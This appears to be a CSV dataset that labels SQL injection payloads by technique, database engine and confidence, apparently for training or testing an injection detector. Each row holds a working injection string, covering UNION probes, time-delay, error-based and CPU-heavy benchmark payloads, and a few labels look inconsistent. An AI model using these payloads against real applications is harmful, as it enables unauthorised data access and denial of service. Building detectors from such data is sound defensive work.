id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21074,"1' ) ) as nuku where 7009 = 7009 union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21075,"1 ) ) union all select null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21076,"1 ) where 2020 = 2020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
21077,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
21078,"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
21079,"1%' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.7,"elt() (P3) takes priority over sleep(P5). MySQL boolean-blind SQLi.",1
21080,"-1015"" ) ) union all select 6624,6624#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21081,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
21082,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",heavy_query,mysql,0.75,"benchmark(5000000,...) = MySQL CPU-intensive heavy query (DoS).",0
21083,"-1487"" ) as crfi where 2407 = 2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21084,"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""umst"" = ""umst",error_based,mysql,0.8,"updatexml() = MySQL error-based SQLi with XPath injection.",1
21085,"1"" ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21086,"-5691' union all select 6610,6610#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21087,"1'|| ( select 'ybfo' from dual where 3319 = 3319 union all select null,null,null,null,null,null,null,null#",union_based,oracle,0.85,"'union all select null' with dual = Oracle union-based SQLi.",2
21088,"-3442' in boolean mode ) union all select 6255,6255,6255,6255,6255#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21089,"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21090,"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",0
21091,"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21092,"1%"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,mysql,0.75,"sleep() = MySQL time-based blind SQLi.",1
21093,1' where 5455 = 5455 and sleep ( 5 ) --,time_blind,mysql,0.85,"sleep() = MySQL time-based blind SQLi.",1
21094,"-2007%' ) ) union all select 7298,7298,7298#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21095,"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",1
21096,"select sleep ( 5 ) and ""jvys"" like ""jvys",time_blind,mysql,0.9,"sleep() = MySQL time-based blind SQLi.",1
21097,"-6086"" union all select 8700,8700,8700,8700--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21098,"1 where 2292 = 2292 union all select null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21099,1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,time_blind,mysql,0.85,"sleep() = MySQL time-based blind SQLi.",1
21100,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
21101,1 ) as uhmm where 2304 = 2304 union all select null#,union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21102,"-1150' ) as hdby where 4032 = 4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21103,"1 ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 8024 = 8024",boolean_blind,mysql,0.7,"elt() (P3) > sleep(P5). MySQL boolean-blind SQLi.",0
21104,"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",time_blind,postgresql,0.9,"pg_sleep() = PostgreSQL time-based blind SQLi.",1
21105,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",boolean_blind,mysql,0.7,"rlike(select sleep()) = MySQL boolean-blind SQLi.",1
21106,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
21107,"1 ) as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
21108,1' ) waitfor delay '0:0:5',time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
21109,"1%"" ) ) union all select null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21110,"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",1
21111,"-2384%' ) ) union all select 2467,2467,2467,2467#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21112,"1"" ) ) union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21113,1'+ ( select 'gmpn' where 8137 = 8137 or sleep ( 5 ) ) +',time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
21114,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",time_blind,mysql,0.75,"sleep() = MySQL time-based blind SQLi.",1
21115,"-5657' ) ) ) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21116,"1%"" ) ) and sleep ( 5 ) #",time_blind,mysql,0.85,"sleep() = MySQL time-based blind SQLi.",1
21117,"1'|| ( select 'ysij' from dual where 6140 = 6140 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) ||'",error_based,oracle,0.8,"extractvalue() = error-based SQLi. Dual + extractvalue indicate Oracle.",1
21118,"1' in boolean mode ) union all select null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21119,"-1559 union all select 3985,3985,3985,3985#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21120,"-5934' union all select 6096,6096,6096,6096,6096#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21121,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21122,"1"" ) ) as jgie where 8017 = 8017 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
21123,1' waitfor delay '0:0:5' and 'dtej' like 'dtej,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
21124,"1' union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21125,"select sleep ( 5 ) and ( ( ""rthl"" like ""rthl",time_blind,mysql,0.9,"sleep() = MySQL time-based blind SQLi.",1
21126,"1' ) ) as owcw where 1107 = 1107 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
21127,"1 ) where 1559 = 1559 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,mysql,0.8,"updatexml() = MySQL error-based SQLi.",1
21128,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21129,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""xyjg"" = ""xyjg",error_based,oracle,0.85,"xmltype() = Oracle error-based SQLi with XML cast error.",1
21130,1'|| ( select 'xwbo' from dual where 1263 = 1263 waitfor delay '0:0:5' ) ||',time_blind,oracle,0.85,"waitfor delay '0:0:5' = time-based blind (MSSQL function used in Oracle context).",1
21131,"1'+ ( select ugvj where 2593 = 2593 union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21132,"1' ) as yuqv where 6007 = 6007 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
21133,-6109 union all select 6784--,union_based,generic,0.8,"'union all select' = union-based SQLi.",2
21134,"1' in boolean mode ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) #",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
21135,"1,extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
21136,1' ) as xrap where 5523 = 5523 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.7,"rlike(select sleep()) = MySQL boolean-blind SQLi.",1
21137,"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""gcyp"" like ""gcyp",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
21138,1' ) ) as hpta where 5376 = 5376 waitfor delay '0:0:5'--,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
21139,1 ) where 2468 = 2468 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
21140,"1%"" ) waitfor delay '0:0:5' and ( ""%"" = """,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
21141,"1' ) ) union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21142,"1"" ) as boeh where 2571 = 2571 union all select null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
21143,"1' ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
